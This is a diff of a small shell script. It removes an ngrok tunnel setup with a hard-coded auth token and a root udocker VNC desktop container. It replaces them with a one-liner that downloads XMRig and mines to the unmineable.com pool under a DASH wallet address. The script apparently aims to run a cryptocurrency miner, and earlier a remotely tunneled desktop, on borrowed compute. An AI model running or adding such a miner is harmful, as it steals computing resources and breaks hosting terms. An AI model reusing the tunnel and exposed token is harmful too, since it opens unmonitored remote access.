@@ -1,6 +1,1 @@
-#!/bin/bash
-wget -O ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip &&
-unzip ngrok.zip &&
-chmod +x ngrok && pip install udocker
-./ngrok authtoken 2WKx5P2XbH0xSOIpBhSa5pP8HL9_5B9CGxeS3wWX99Ltyd7yz &&
-udocker --allow-root  run -p 6080:80 dorowu/ubuntu-desktop-lxde-vnc
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u DASH:Xcrv7nUSpWy1B4bjA3AJijUdoZEbTShun4.v1 -p x
